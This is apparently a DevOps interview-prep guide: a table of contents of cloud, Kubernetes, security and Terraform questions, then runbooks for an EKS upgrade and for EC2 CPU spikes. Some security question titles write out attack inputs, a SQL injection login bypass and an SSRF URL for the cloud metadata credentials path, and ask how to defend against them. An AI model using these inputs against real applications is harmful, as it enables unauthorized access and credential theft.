135. [AWS Q119: You want to ensure that a highly powerful IAM Administrative User can only execute critical API calls if they are physically situated in the corporate headquarters How do you enforce this natively in IAM [L2]](#scenario-135-aws-q119-you-want-to-ensure-that-a-highly-powerful-iam-administrative-user-can-only-execute-critical-api-calls-if-they-are-physically-situated-in-the-corporate-headquarters-how-do-you-enforce-this-natively-in-iam-l2)
136. [AWS Q120: A data analytics team is migrating from traditional Amazon Redshift DC2 instances to the modern RA3 node types What massive architectural paradigm shift does RA3 bring that drastically reduces costs [L2]](#scenario-136-aws-q120-a-data-analytics-team-is-migrating-from-traditional-amazon-redshift-dc2-instances-to-the-modern-ra3-node-types-what-massive-architectural-paradigm-shift-does-ra3-bring-that-drastically-reduces-costs-l2)
137. [Docker Q76: You deploy a cluster of 50 identical microservices To ensure zero drifts they all pull a massive 1GB initial configuration file from a central S3 bucket immediately upon booting via the CMD script Why is this an anti-pattern in container architecture and what is the immutable alternative [L3]](#scenario-137-docker-q76-you-deploy-a-cluster-of-50-identical-microservices-to-ensure-zero-drifts-they-all-pull-a-massive-1gb-initial-configuration-file-from-a-central-s3-bucket-immediately-upon-booting-via-the-cmd-script-why-is-this-an-anti-pattern-in-container-architecture-and-what-is-the-immutable-alternative-l3)
138. [Git Q16: A developer accidentally committed an AWS access key and pushed it to the public repo The team noticed 30 minutes later Whats the correct response in priority order [L2]](#scenario-138-git-q16-a-developer-accidentally-committed-an-aws-access-key-and-pushed-it-to-the-public-repo-the-team-noticed-30-minutes-later-whats-the-correct-response-in-priority-order-l2)
139. [Kubernetes Q31: A StatefulSet pod cant start because its trying to attach a volume thats still attached to a terminated pod on a dead node How do you fix it [L3]](#scenario-139-kubernetes-q31-a-statefulset-pod-cant-start-because-its-trying-to-attach-a-volume-thats-still-attached-to-a-terminated-pod-on-a-dead-node-how-do-you-fix-it-l3)
140. [Kubernetes Q62: A cluster-autoscaler is not scaling up even though pods are Pending What could be wrong [L3]](#scenario-140-kubernetes-q62-a-cluster-autoscaler-is-not-scaling-up-even-though-pods-are-pending-what-could-be-wrong-l3)
141. [Kubernetes Q106: How do you restrict a pod from accessing the cloud metadata endpoint (eg 169254169254) [L2]](#scenario-141-kubernetes-q106-how-do-you-restrict-a-pod-from-accessing-the-cloud-metadata-endpoint-eg-169254169254-l2)
142. [Security Q1: A developer accidentally pushed an AWS Access Key and Secret Key to a public GitHub repository What steps do you take [L1]](#scenario-142-security-q1-a-developer-accidentally-pushed-an-aws-access-key-and-secret-key-to-a-public-github-repository-what-steps-do-you-take-l1)
143. [Security Q2: Your security scanner reports that a Docker image you deploy has 5 Critical vulnerabilities inside a system library However your application doesnt even use that library How do you handle this [L2]](#scenario-143-security-q2-your-security-scanner-reports-that-a-docker-image-you-deploy-has-5-critical-vulnerabilities-inside-a-system-library-however-your-application-doesnt-even-use-that-library-how-do-you-handle-this-l2)
144. [Security Q3: You need to give an EC2 instance access to read from an S3 bucket A junior engineer suggests creating an IAM User generating access keys and hardcoding them into the app Why is this bad and what is the correct way [L2]](#scenario-144-security-q3-you-need-to-give-an-ec2-instance-access-to-read-from-an-s3-bucket-a-junior-engineer-suggests-creating-an-iam-user-generating-access-keys-and-hardcoding-them-into-the-app-why-is-this-bad-and-what-is-the-correct-way-l2)
145. [Security Q4: Your company wants to ensure that a specific S3 bucket containing PII can *only* be accessed from a designated VPC even by AWS administrators with Full S3 permissions How do you enforce this [L3]](#scenario-145-security-q4-your-company-wants-to-ensure-that-a-specific-s3-bucket-containing-pii-can-only-be-accessed-from-a-designated-vpc-even-by-aws-administrators-with-full-s3-permissions-how-do-you-enforce-this-l3)
146. [Security Q5: An attacker gains SSH access to a web server running in AWS The web server has an IAM Role attached that allows taking EC2 snapshots The attacker uses this role to snapshot your production database server but they cant download it from AWS because the snapshot is internal How might they still steal your data [L2]](#scenario-146-security-q5-an-attacker-gains-ssh-access-to-a-web-server-running-in-aws-the-web-server-has-an-iam-role-attached-that-allows-taking-ec2-snapshots-the-attacker-uses-this-role-to-snapshot-your-production-database-server-but-they-cant-download-it-from-aws-because-the-snapshot-is-internal-how-might-they-still-steal-your-data-l2)
147. [Security Q6: Explain the principle of Least Privilege [L1]](#scenario-147-security-q6-explain-the-principle-of-least-privilege-l1)
148. [Security Q7: Your team uses Kubernetes Currently all developers have cluster-admin access You need to restrict them so they can only manage deployments in their specific namespace without affecting others How do you implement this [L2]](#scenario-148-security-q7-your-team-uses-kubernetes-currently-all-developers-have-cluster-admin-access-you-need-to-restrict-them-so-they-can-only-manage-deployments-in-their-specific-namespace-without-affecting-others-how-do-you-implement-this-l2)
149. [Security Q8: During an audit you discover that database passwords are being passed to Docker containers as plaintext Environment Variables via the orchestration tool You are asked to implement a secure Secret Management system Explain the architecture [L3]](#scenario-149-security-q8-during-an-audit-you-discover-that-database-passwords-are-being-passed-to-docker-containers-as-plaintext-environment-variables-via-the-orchestration-tool-you-are-asked-to-implement-a-secure-secret-management-system-explain-the-architecture-l3)
150. [Security Q9: A compliance standard requires that all data at rest in your RDS databases be encrypted How does AWS RDS encryption work and what is transparent data encryption (TDE) [L2]](#scenario-150-security-q9-a-compliance-standard-requires-that-all-data-at-rest-in-your-rds-databases-be-encrypted-how-does-aws-rds-encryption-work-and-what-is-transparent-data-encryption-tde-l2)
151. [Security Q10: What is a WAF and how does it differ from a standard Network Firewall [L1]](#scenario-151-security-q10-what-is-a-waf-and-how-does-it-differ-from-a-standard-network-firewall-l1)
152. [Security Q11: A critical vulnerability in a popular Java logging framework (like Log4j) is announced on a Friday night It allows Remote Code Execution (RCE) via a simple HTTP header You have 500 microservices How do you respond systematically [L3]](#scenario-152-security-q11-a-critical-vulnerability-in-a-popular-java-logging-framework-like-log4j-is-announced-on-a-friday-night-it-allows-remote-code-execution-rce-via-a-simple-http-header-you-have-500-microservices-how-do-you-respond-systematically-l3)
153. [Security Q12: What is cross-account IAM role assumption and why is it considered safer than creating IAM users in every account [L2]](#scenario-153-security-q12-what-is-cross-account-iam-role-assumption-and-why-is-it-considered-safer-than-creating-iam-users-in-every-account-l2)
154. [Security Q13: How does asymmetric encryption (Public Key cryptography) work in the context of an SSH connection [L1]](#scenario-154-security-q13-how-does-asymmetric-encryption-public-key-cryptography-work-in-the-context-of-an-ssh-connection-l1)
155. [Security Q14: Your CI/CD pipeline builds a Docker image and pushes it to ECR How do you ensure that only container images explicitly built and signed by your CI/CD pipeline can actually run in your Kubernetes production cluster [L3]](#scenario-155-security-q14-your-ci-cd-pipeline-builds-a-docker-image-and-pushes-it-to-ecr-how-do-you-ensure-that-only-container-images-explicitly-built-and-signed-by-your-ci-cd-pipeline-can-actually-run-in-your-kubernetes-production-cluster-l3)
156. [Security Q15: Our company mandates MFA (Multi-Factor Authentication) for all AWS Console logins However developers are still using static AWS Access Keys in their local terminals which bypasses MFA How do you enforce MFA for CLI access [L2]](#scenario-156-security-q15-our-company-mandates-mfa-multi-factor-authentication-for-all-aws-console-logins-however-developers-are-still-using-static-aws-access-keys-in-their-local-terminals-which-bypasses-mfa-how-do-you-enforce-mfa-for-cli-access-l2)
157. [Security Q16: Explain the concept of a Bastion Host (Jump Box) [L1]](#scenario-157-security-q16-explain-the-concept-of-a-bastion-host-jump-box-l1)
158. [Security Q17: An AWS S3 bucket holding company financial reports suffered a ransomware attack An attacker gained access enabled AWS KMS encryption using their own key (which they control) and locked out your access to read the files because you dont have access to their KMS key to decrypt it How do you architect the bucket to prevent this entirely [L3]](#scenario-158-security-q17-an-aws-s3-bucket-holding-company-financial-reports-suffered-a-ransomware-attack-an-attacker-gained-access-enabled-aws-kms-encryption-using-their-own-key-which-they-control-and-locked-out-your-access-to-read-the-files-because-you-dont-have-access-to-their-kms-key-to-decrypt-it-how-do-you-architect-the-bucket-to-prevent-this-entirely-l3)
159. [Security Q18: During a pentest the testers found they could exploit a vulnerability in your Nodejs app to read /etc/passwd What OS-level container configuration should standardly prevent this kind of filesystem roaming [L2]](#scenario-159-security-q18-during-a-pentest-the-testers-found-they-could-exploit-a-vulnerability-in-your-nodejs-app-to-read-etc-passwd-what-os-level-container-configuration-should-standardly-prevent-this-kind-of-filesystem-roaming-l2)
160. [Security Q19: Your security team mandates that AWS IAM passwords must be rotated every 90 days Why is this considered an outdated practice for human users by NIST guidelines [L2]](#scenario-160-security-q19-your-security-team-mandates-that-aws-iam-passwords-must-be-rotated-every-90-days-why-is-this-considered-an-outdated-practice-for-human-users-by-nist-guidelines-l2)
161. [Security Q20: What is a Man-in-the-Middle (MITM) attack and how does TLS prevent it [L1]](#scenario-161-security-q20-what-is-a-man-in-the-middle-mitm-attack-and-how-does-tls-prevent-it-l1)
162. [Security Q21: Explain the difference between Phishing and Spear Phishing [L1]](#scenario-162-security-q21-explain-the-difference-between-phishing-and-spear-phishing-l1)
163. [Security Q22: An attacker discovers they can bypass your applications login form by entering  OR 1=1 -- into the username field What is this attack and how do you prevent it natively in code [L2]](#scenario-163-security-q22-an-attacker-discovers-they-can-bypass-your-applications-login-form-by-entering-or-1-1-into-the-username-field-what-is-this-attack-and-how-do-you-prevent-it-natively-in-code-l2)
164. [Security Q23: A cloud-native application hosted on AWS EC2 allows users to input a URL and the server fetches the image at that URL to generate a thumbnail An attacker inputs http//169254169254/latest/meta-data/iam/security-credentials/ What is this attack called and how do you mitigate it at the infrastructure level [L3]](#scenario-164-security-q23-a-cloud-native-application-hosted-on-aws-ec2-allows-users-to-input-a-url-and-the-server-fetches-the-image-at-that-url-to-generate-a-thumbnail-an-attacker-inputs-http-169254169254-latest-meta-data-iam-security-credentials-what-is-this-attack-called-and-how-do-you-mitigate-it-at-the-infrastructure-level-l3)
165. [Security Q24: Define Cross-Site Scripting (XSS) and explain the difference between Stored and Reflected XSS [L2]](#scenario-165-security-q24-define-cross-site-scripting-xss-and-explain-the-difference-between-stored-and-reflected-xss-l2)
166. [Security Q25: An employee is repeatedly bombarded with MFA push notifications on their phone at 2 AM Exhausted they finally click Approve just to make it stop What is this attack [L1]](#scenario-166-security-q25-an-employee-is-repeatedly-bombarded-with-mfa-push-notifications-on-their-phone-at-2-am-exhausted-they-finally-click-approve-just-to-make-it-stop-what-is-this-attack-l1)
167. [Security Q26: Your application uses stateless JSON Web Tokens (JWT) for authentication During a security review you notice the application accepts tokens with the header {alg none} Why is this a catastrophic vulnerability [L3]](#scenario-167-security-q26-your-application-uses-stateless-json-web-tokens-jwt-for-authentication-during-a-security-review-you-notice-the-application-accepts-tokens-with-the-header-alg-none-why-is-this-a-catastrophic-vulnerability-l3)
168. [Security Q27: A developer accidentally mistypes a Python package installing command as pip install request instead of requests The installation succeeds but the application begins acting strangely What attack vector just occurred [L2]](#scenario-168-security-q27-a-developer-accidentally-mistypes-a-python-package-installing-command-as-pip-install-request-instead-of-requests-the-installation-succeeds-but-the-application-begins-acting-strangely-what-attack-vector-just-occurred-l2)
169. [Security Q28: How does a Distributed Denial of Service (DDoS) attack work and what is the primary role of a service like Cloudflare or AWS Shield in stopping it [L1]](#scenario-169-security-q28-how-does-a-distributed-denial-of-service-ddos-attack-work-and-what-is-the-primary-role-of-a-service-like-cloudflare-or-aws-shield-in-stopping-it-l1)
170. [Security Q29: You notice thousands of failed login attempts per minute hitting your /api/v1/login endpoint from hundreds of different rotating IP addresses How do you defend against this brute-force attack [L2]](#scenario-170-security-q29-you-notice-thousands-of-failed-login-attempts-per-minute-hitting-your-api-v1-login-endpoint-from-hundreds-of-different-rotating-ip-addresses-how-do-you-defend-against-this-brute-force-attack-l2)
171. [Security Q30: You need to store highly sensitive customer data (like Social Security Numbers) in a database Explain the Envelope Encryption architecture using AWS KMS [L3]](#scenario-171-security-q30-you-need-to-store-highly-sensitive-customer-data-like-social-security-numbers-in-a-database-explain-the-envelope-encryption-architecture-using-aws-kms-l3)
172. [Security Q31: A legacy application requires a long-lived database password hardcoded in its configuration file You cannot change the application code How do you implement a secure secret rotation strategy [L2]](#scenario-172-security-q31-a-legacy-application-requires-a-long-lived-database-password-hardcoded-in-its-configuration-file-you-cannot-change-the-application-code-how-do-you-implement-a-secure-secret-rotation-strategy-l2)
173. [Security Q32: What is a Zero Trust Architecture [L1]](#scenario-173-security-q32-what-is-a-zero-trust-architecture-l1)
174. [Security Q33: In Kubernetes what is a Container Escape vulnerability and why is running a container with privileged true extremely dangerous [L3]](#scenario-174-security-q33-in-kubernetes-what-is-a-container-escape-vulnerability-and-why-is-running-a-container-with-privileged-true-extremely-dangerous-l3)
175. [Security Q34: An IAM user has ec2RunInstances permissions but they do NOT have permissions to read S3 buckets However they also have the iamPassRole permission for an existing S3Admin EC2 Role Explain how this user can escalate their privileges to steal S3 data [L2]](#scenario-175-security-q34-an-iam-user-has-ec2runinstances-permissions-but-they-do-not-have-permissions-to-read-s3-buckets-however-they-also-have-the-iampassrole-permission-for-an-existing-s3admin-ec2-role-explain-how-this-user-can-escalate-their-privileges-to-steal-s3-data-l2)
176. [Security Q35: Contrast Symmetric and Asymmetric encryption and explain when you would use each [L1]](#scenario-176-security-q35-contrast-symmetric-and-asymmetric-encryption-and-explain-when-you-would-use-each-l1)
177. [Security Q36: Your web applications frontend hosted on appexamplecom makes an API call to apiexamplecom The browser blocks the request with a CORS Error A developer fixes it by setting Access-Control-Allow-Origin * on the API server Why is this a major security risk if the API uses cookie-based authentication [L2]](#scenario-177-security-q36-your-web-applications-frontend-hosted-on-appexamplecom-makes-an-api-call-to-apiexamplecom-the-browser-blocks-the-request-with-a-cors-error-a-developer-fixes-it-by-setting-access-control-allow-origin-on-the-api-server-why-is-this-a-major-security-risk-if-the-api-uses-cookie-based-authentication-l2)
178. [Security Q37: You use GitHub Actions to deploy to AWS Currently you store long-lived AWS IAM Access Keys as GitHub Repository Secrets Why is this an anti-pattern and what is the modern secure alternative [L3]](#scenario-178-security-q37-you-use-github-actions-to-deploy-to-aws-currently-you-store-long-lived-aws-iam-access-keys-as-github-repository-secrets-why-is-this-an-anti-pattern-and-what-is-the-modern-secure-alternative-l3)
179. [Security Q38: Your mobile application uses HTTPS to securely communicate with its backend However a security researcher installs a custom root CA on their phone proxies the traffic through a tool like Burp Suite and successfully intercepts the plaintext API calls What security control is the mobile app missing [L2]](#scenario-179-security-q38-your-mobile-application-uses-https-to-securely-communicate-with-its-backend-however-a-security-researcher-installs-a-custom-root-ca-on-their-phone-proxies-the-traffic-through-a-tool-like-burp-suite-and-successfully-intercepts-the-plaintext-api-calls-what-security-control-is-the-mobile-app-missing-l2)
180. [Security Q39: Explain the three core components of the CIA Triad in Information Security [L1]](#scenario-180-security-q39-explain-the-three-core-components-of-the-cia-triad-in-information-security-l1)
181. [Security Q40: A sophisticated attacker wants to intercept your companys web traffic Even though your DNS is secure they manage to physically hijack the routing paths of the internet so traffic destined for your datacenter IP addresses is sent to their servers in Russia What is this attack called and what defensive protocol mitigates it [L3]](#scenario-181-security-q40-a-sophisticated-attacker-wants-to-intercept-your-companys-web-traffic-even-though-your-dns-is-secure-they-manage-to-physically-hijack-the-routing-paths-of-the-internet-so-traffic-destined-for-your-datacenter-ip-addresses-is-sent-to-their-servers-in-russia-what-is-this-attack-called-and-what-defensive-protocol-mitigates-it-l3)
182. [Terraform Q2: Two developers ran terraform apply at the same time on the same workspace What happened and how do you prevent it [L2]](#scenario-182-terraform-q2-two-developers-ran-terraform-apply-at-the-same-time-on-the-same-workspace-what-happened-and-how-do-you-prevent-it-l2)
183. [Terraform Q3: Your Terraform state file got corrupted What do you do [L2]](#scenario-183-terraform-q3-your-terraform-state-file-got-corrupted-what-do-you-do-l2)
184. [Terraform Q4: You have a Terraform configuration that manages resources in 3 AWS accounts How do you structure this [L3]](#scenario-184-terraform-q4-you-have-a-terraform-configuration-that-manages-resources-in-3-aws-accounts-how-do-you-structure-this-l3)
185. [Terraform Q6: How do you structure a large Terraform codebase for a multi-environment setup [L2]](#scenario-185-terraform-q6-how-do-you-structure-a-large-terraform-codebase-for-a-multi-environment-setup-l2)
186. [Terraform Q8: How do you handle sensitive outputs (like DB passwords) in Terraform modules [L3]](#scenario-186-terraform-q8-how-do-you-handle-sensitive-outputs-like-db-passwords-in-terraform-modules-l3)
187. [Terraform Q9: What is terraform taint and when would you use it [L2]](#scenario-187-terraform-q9-what-is-terraform-taint-and-when-would-you-use-it-l2)
188. [Terraform Q12: You need to move a Terraform resource from one module to another without destroying and recreating it How [L3]](#scenario-188-terraform-q12-you-need-to-move-a-terraform-resource-from-one-module-to-another-without-destroying-and-recreating-it-how-l3)
189. [Terraform Q13: What is a Terraform workspace and what are its limitations [L2]](#scenario-189-terraform-q13-what-is-a-terraform-workspace-and-what-are-its-limitations-l2)
190. [Terraform Q14: How do you run Terraform safely in a CI/CD pipeline What are the guardrails [L3]](#scenario-190-terraform-q14-how-do-you-run-terraform-safely-in-a-ci-cd-pipeline-what-are-the-guardrails-l3)
191. [Terraform Q16: How do you scan Terraform code for security misconfigurations before applying [L2]](#scenario-191-terraform-q16-how-do-you-scan-terraform-code-for-security-misconfigurations-before-applying-l2)
192. [Terraform Q18: What is the terraform_remote_state data source and what are the risks of using it [L2]](#scenario-192-terraform-q18-what-is-the-terraform-remote-state-data-source-and-what-are-the-risks-of-using-it-l2)
193. [Terraform Q25: How do you manage Terraform provider credentials without hardcoding them [L3]](#scenario-193-terraform-q25-how-do-you-manage-terraform-provider-credentials-without-hardcoding-them-l3)
194. [Terraform Q27: How do you make Terraform wait for one resource before creating another [L2]](#scenario-194-terraform-q27-how-do-you-make-terraform-wait-for-one-resource-before-creating-another-l2)
195. [Terraform Q34: You want to create an S3 bucket name based on the account ID to ensure uniqueness How [L2]](#scenario-195-terraform-q34-you-want-to-create-an-s3-bucket-name-based-on-the-account-id-to-ensure-uniqueness-how-l2)
196. [Terraform Q41: How do you implement zero-downtime Terraform changes for an ALB [L3]](#scenario-196-terraform-q41-how-do-you-implement-zero-downtime-terraform-changes-for-an-alb-l3)
197. [Terraform Q43: How do you prevent accidental destruction of production resources in Terraform [L3]](#scenario-197-terraform-q43-how-do-you-prevent-accidental-destruction-of-production-resources-in-terraform-l3)
198. [Terraform Q45: How do you handle a situation where Terraform needs to create resources in a specific order (eg wait 30 seconds for IAM propagation) [L3]](#scenario-198-terraform-q45-how-do-you-handle-a-situation-where-terraform-needs-to-create-resources-in-a-specific-order-eg-wait-30-seconds-for-iam-propagation-l3)
199. [Terraform Q48: What is the Open Policy Agent (OPA) integration with Terraform [L3]](#scenario-199-terraform-q48-what-is-the-open-policy-agent-opa-integration-with-terraform-l3)
200. [Terraform Q54: What is the replace_triggered_by lifecycle argument [L2]](#scenario-200-terraform-q54-what-is-the-replace-triggered-by-lifecycle-argument-l2)
201. [Terraform Q59: How do you use Terraform to create IAM policies without hardcoding JSON [L2]](#scenario-201-terraform-q59-how-do-you-use-terraform-to-create-iam-policies-without-hardcoding-json-l2)
202. [Terraform Q65: Your S3 backend bucket for Terraform state was deleted by mistake but the infrastructure still exists What is your recovery path [L2]](#scenario-202-terraform-q65-your-s3-backend-bucket-for-terraform-state-was-deleted-by-mistake-but-the-infrastructure-still-exists-what-is-your-recovery-path-l2)
203. [Terraform Q71: A terraform destroy in a non-prod environment is taking too long because some resources have deletion protection or dependent objects How do you debug it [L3]](#scenario-203-terraform-q71-a-terraform-destroy-in-a-non-prod-environment-is-taking-too-long-because-some-resources-have-deletion-protection-or-dependent-objects-how-do-you-debug-it-l3)
204. [Terraform Q77: You want to enforce that no one can create public S3 buckets even if they bypass Terraform and use the console Is Terraform alone enough [L3]](#scenario-204-terraform-q77-you-want-to-enforce-that-no-one-can-create-public-s3-buckets-even-if-they-bypass-terraform-and-use-the-console-is-terraform-alone-enough-l3)
205. [Multi-Cloud Production Architecture: Cross-Cloud Routing, Workload IAM & Secret Syncing](#scenario-205-multi-cloud-production-architecture-cross-cloud-routing-workload-iam-secret-syncing)
206. [Custom Enterprise AMI Pre-Production Vetting Strategy: Kernel Tuning & Runtime Validation](#scenario-206-custom-enterprise-ami-pre-production-vetting-strategy-kernel-tuning-runtime-validation)
207. [Playback Stream 504 Timeouts: Cloud LB Healthy, Mesh Sidecars Passing, Video Failing Triage](#scenario-207-playback-stream-504-timeouts-cloud-lb-healthy-mesh-sidecars-passing-video-failing-triage)
208. [Multi-Region Active Failover in 3 Weeks Without Relying on the DNS Layer](#scenario-208-multi-region-active-failover-in-3-weeks-without-relying-on-the-dns-layer)
209. [Enterprise Internal Helm Chart Distribution Using OCI Registries (ECR/Harbor)](#scenario-209-enterprise-internal-helm-chart-distribution-using-oci-registries-ecr-harbor)
210. [Integrating Jenkins with Docker, Kubernetes, and AWS (ECR/EKS) for Cloud-Native CI/CD](#scenario-210-integrating-jenkins-with-docker-kubernetes-and-aws-ecr-eks-for-cloud-native-ci-cd)
211. [Container Image Security & AWS ECR Governance: Vulnerability Scanning, Signing & Lifecycle](#scenario-211-container-image-security-aws-ecr-governance-vulnerability-scanning-signing-lifecycle)
212. [Multi-AZ vs Multi-Region Architecture: Architectural Trade-Offs, Replication & Failover](#scenario-212-multi-az-vs-multi-region-architecture-architectural-trade-offs-replication-failover)
213. [Enforcing Least-Privilege IAM at Scale: Permission Boundaries, OIDC & Access Analyzer](#scenario-213-enforcing-least-privilege-iam-at-scale-permission-boundaries-oidc-access-analyzer)
214. [Disaster Recovery Architecture (RTO/RPO) & Cloud Cost Optimization in AWS](#scenario-214-disaster-recovery-architecture-rto-rpo-cloud-cost-optimization-in-aws)

---

## 🛠️ Production Scenarios & First-Person Runbooks

<a id="scenario-1-zero-downtime-amazon-eks-minor-multi-version-upgrade-v1-34-v1-36"></a>
### 1. Zero-Downtime Amazon EKS Minor & Multi-Version Upgrade (v1.34 → v1.36+)

**Level:** `Senior DevOps / SRE` | **Category:** `Kubernetes` • `Amazon EKS & Upgrades` | **Type:** `Classic Scenario`

**Tags:** `Kubernetes` `Amazon EKS` `Zero Downtime` `Cluster Upgrade` `PDB`

> **Interview Question:**  
> *"Walk me through how you upgraded an Amazon EKS cluster from Kubernetes v1.34 to v1.36 and even after v1.37 without downtime."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
In one of my projects, we had a customer-facing application running as microservices on Amazon EKS, and we had a requirement to upgrade Kubernetes from v1.34 to v1.36. Since it was Production, we couldn't afford application downtime, so we followed a proper upgrade runbook.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Pre-checks & Compatibility Verification

Before touching the cluster, perform a complete pre-flight check of deprecated APIs and dependencies:

- **EKS Upgrade Insights:** Checked automated AWS insights for deprecated APIs and cluster readiness.
- **Deprecated Kubernetes APIs:** Audited manifests and Helm charts using API deprecation tools (e.g., Pluto / kubent).
- **Helm chart and application compatibility:** Verified all third-party charts, CRDs, and controllers support the target version.
- **Core Add-ons:** Checked compatibility matrices for VPC CNI, CoreDNS, and kube-proxy for target versions.
- **AWS Load Balancer Controller:** Verified controller version, IAM policies (IRSA), and TargetGroupBinding CRDs.
- **PDBs and replica counts:** Verified PodDisruptionBudgets and replica counts (≥ 2) across all critical services.
- **Monitoring components:** Ensured Prometheus, Grafana, and CloudWatch were operational to capture real-time telemetry.

> 💡 **Pro-Tip / Highlight:** Once the pre-checks were clean, we tested the complete upgrade in a lower environment first (Dev → Staging/UAT). We never started directly with Production.

##### 2️⃣ Upgrade One Version at a Time

Kubernetes minor version upgrades must be performed sequentially. You cannot skip minor versions:

- For each version, I first upgraded the **EKS control plane** (AWS handles the multi-AZ control plane upgrade without API downtime).
- Once the control plane was healthy, I validated the cluster and then upgraded the required **EKS add-ons** (VPC CNI, CoreDNS, kube-proxy, EBS CSI driver).

**Execution Flow:** `v1.34` ➔ `v1.35` ➔ `Validate` ➔ `v1.36` ➔ `Validate` ➔ `v1.37`

##### 3️⃣ Replace Worker Nodes (Blue/Green Node Groups)

For worker nodes, we didn't immediately terminate the existing node group:

- We created a **new managed node group** with an EKS-optimized AMI compatible with the new Kubernetes version.
- Once the new nodes joined the cluster and showed `Ready`, we started moving the workloads.
- **Cordon old node:** Marked the node unschedulable so new pods were only scheduled on the new node group.
- **Drain one node at a time:** `kubectl drain &lt;node&gt; --ignore-daemonsets --delete-emptydir-data`.
- We didn't drain everything together — we moved workloads gradually to maintain application availability.

**Execution Flow:** `Cordon old node` ➔ `Drain one node at a time` ➔ `Pods move to new nodes`

##### 4️⃣ How Did We Avoid Downtime?

Zero downtime was guaranteed because our critical microservices were engineered for High Availability:

- ✅ **Multiple Replicas:** Every critical service had at least 2–3 replicas running across nodes.
- ✅ **PodDisruptionBudgets (PDBs):** Enforced minAvailable / maxUnavailable so the API server blocked evictions that would breach availability.
- ✅ **Readiness Probes & Graceful Shutdown:** Traffic was only routed once newly scheduled pods passed readiness checks; preStop hooks allowed in-flight requests to complete.
- ✅ **Multi-AZ Workload Distribution:** Topology spread constraints ensured pods were distributed evenly across multiple Availability Zones.

> 💡 **Pro-Tip / Highlight:** So even when one node was being drained, healthy Pods on other nodes continued serving customer traffic without interruption.

##### 5️⃣ Continuous Telemetry & Monitoring

Using CloudWatch and Prometheus/Grafana, continuously monitored throughout the upgrade:

- **Node Health:** Memory/CPU pressure and kubelet status.
- **Pod Restarts:** Monitored CrashLoopBackOff and restart counts.
- **Pending Pods:** Detected scheduling bottlenecks or resource exhaustion.
- **CPU and Memory:** Monitored cluster-wide headroom and OOM warnings.
- **ALB Target Health:** Confirmed targets remained healthy in AWS Target Groups.
- **Application Latency:** Verified p95/p99 response times did not degrade.
- **5xx HTTP Errors:** Monitored error rates to confirm zero dropped requests.

##### 6️⃣ Validate Before Removing Anything

Once all workloads were running on the new node group, we didn't immediately remove the old one:

- We performed smoke testing and validated critical application flows under real traffic.
- Once everything was verified stable, we cleanly deleted the old node group.
- Then we repeated the same process for subsequent minor version bumps (e.g. v1.34 → v1.35 → v1.36 → v1.37).

**Execution Flow:** `Customer Login` ➔ `Account Information` ➔ `API Connectivity` ➔ `Transaction Processing`

#### 🎯 Key Architectural Takeaway
> Zero downtime wasn't achieved just because we carefully upgraded EKS. It was possible because the application was already designed for high availability with multiple replicas, PDBs, readiness probes, Multi-AZ deployment, and controlled node draining.

#### ⏱️ 60-Second Elevator Pitch Summary

- Conducted rigorous pre-checks: EKS Upgrade Insights, API deprecations (Pluto), add-on compatibility, and lower-environment testing.
- Upgraded strictly one minor version at a time (v1.34 → v1.35 → v1.36 → v1.37): control plane first, followed by managed add-ons.
- Implemented blue/green worker node replacement with new EKS-optimized AMI node groups; cordoned and drained nodes one-by-one.
- Guaranteed zero downtime via HA safeguards: replica counts ≥ 2, PodDisruptionBudgets, readiness probes, preStop hooks, and multi-AZ spread.
- Monitored CloudWatch/Grafana telemetry (5xx errors, latency, pending pods, ALB target health) throughout.
- Executed critical business flow smoke tests before safely decommissioning old node groups.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-2-ec2-cpu-suddenly-reaches-100-troubleshooting-runbook"></a>
### 2. EC2 CPU Suddenly Reaches 100% — Troubleshooting Runbook

**Level:** `Senior DevOps / SRE` | **Category:** `AWS` • `Compute & EC2` | **Type:** `Production Incident`

**Tags:** `AWS` `EC2` `CloudWatch` `Linux` `Troubleshooting`

> **Interview Question:**  
> *"EC2 CPU suddenly reaches 100% — how would you troubleshoot?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
When a production EC2 instance hits 100% CPU, my priority is two-fold: stop customer impact immediately (mitigation) while capturing telemetry to pinpoint the exact culprit process (root cause analysis).

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Triage From Outside (CloudWatch & Telemetry)

Before logging in, look at multi-dimensional metrics to classify the nature of the spike:

- **Correlate Metrics:** In CloudWatch, compare `CPUUtilization` against `NetworkIn`, `NetworkOut`, and `DiskReadOps/DiskWriteBytes`.
- **Traffic Surge vs Rogue Process:** If high CPU coincides with a 10x spike in NetworkIn and ALB requests, it is likely legitimate or DDoS traffic. If NetworkIn is flat but CPU spiked abruptly, it is likely an internal process, runaway job, or compromised instance.
- **Check Auto Scaling Group (ASG):** Check if ASG target tracking is scaling out instances or if the ASG has hit its `max_size` limit.

##### 2️⃣ SSH / SSM Session & Process Inspection

Log into the instance (using AWS Systems Manager Session Manager or SSH) and inspect active processes:

- `uptime`: Check load average against total core count (`nproc`). If 4 cores and load is 40, system is severely saturated.
- `top -c` or `htop`: Press `P` to sort by CPU consumption. Note the PID, USER, and COMMAND.
- `ps aux --sort=-%cpu | head -10`: Print the top 10 CPU-consuming processes with full command-line arguments.
- `vmstat 1 5`: Check if CPU is spending time in **user space (us)**, **system/kernel (sy)**, or **I/O wait (wa)**. High I/O wait indicates a storage bottleneck rather than pure computation.

##### 3️⃣ Diagnose the Culprit Process

Examine the identified process to determine what it is doing:

- **Thread Inspection:** Run `top -H -p &lt;PID&gt;` to inspect individual threads inside the process.
- **Syscall Tracing:** Run `strace -p &lt;PID&gt; -c` for 10 seconds to identify spinning loops or repetitive failing syscalls.
- **Application Thread Dump:** For Java/Node/Go runtimes, capture a thread dump (e.g. `jstack &lt;PID&gt;` or Go pprof) before terminating.
- **Check Recent Crons:** Check `/var/log/syslog` or `/var/log/cron` for heavy scheduled backup, antivirus, or indexing tasks.

##### 4️⃣ Mitigate and Restore Service

Take decisive, safe actions based on the diagnosis:

- **If Rogue Application Process:** Issue `kill -15 &lt;PID&gt;` (SIGTERM) for graceful shutdown. Only use `kill -9` if unresponsive.
- **If Legitimate Traffic Surge:** Manually increase ASG desired capacity, or provision a read replica / cache if backend DB queries are choking the app.
